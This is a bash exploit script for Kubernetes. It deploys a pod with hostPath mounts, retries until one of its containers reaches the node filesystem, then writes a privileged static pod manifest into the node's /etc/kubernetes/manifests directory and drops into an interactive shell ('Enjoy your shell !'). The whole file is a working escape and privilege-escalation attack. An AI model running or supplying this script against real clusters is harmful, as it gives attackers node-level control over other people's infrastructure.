#!/usr/bin/env bash

while [ 1 -lt 2 ]
do
	printf "\033[2m"
	kubectl apply -f attack.yaml;
	kubectl wait --for=condition=Running pod/hostpath4everyone --timeout=40s
	for c in {1..10}; do
		listing=$(kubectl logs hostpath4everyone mount-container$c);
		if [ "$listing" = "" ];
		then
			echo -n "$c‚ùå"
		else
			echo -n " $cüß®"
			# echo "run 'kubectl exec -i -t hostpath4everyone -c mount-container$c -- /bin/bash' and then 'ls /mnt/data$c"
			printf "Post-exploitation: Create static privileged pods\n"
			kubectl cp ./privesc.yaml hostpath4everyone:/mnt/data$c/etc/kubernetes/manifests/ -c mount-container$c
			kubectl -n kube-public wait --for=condition=Ready pod -l app=privesc
			POD_NAME=$(kubectl get pod -l app=privesc -n kube-public -o name | head -n 1)
			printf "\033[0m"
			printf "Enjoy your shell ! ü™Ñ\n"
			kubectl -n kube-public exec -it $POD_NAME -- bash
			kubectl delete pod hostpath4everyone
			exit
		fi
	done
	printf "\033[0m"
	echo -e "\nBad attempts. Delete pod and retry.."
	printf "\033[2m"
	kubectl delete pod hostpath4everyone
	printf "\033[0m"
done